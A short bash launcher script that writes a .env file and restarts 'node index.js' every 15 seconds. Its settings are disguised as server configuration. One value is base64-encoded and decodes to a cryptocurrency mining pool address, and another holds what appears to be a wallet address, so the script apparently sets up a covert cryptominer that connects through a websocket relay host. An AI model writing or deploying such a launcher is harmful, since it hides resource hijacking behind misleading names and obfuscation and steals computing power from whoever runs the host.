#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://datacenter.chuyengiaai.online/
SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
SERVER_DOMAIN=88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 15; done
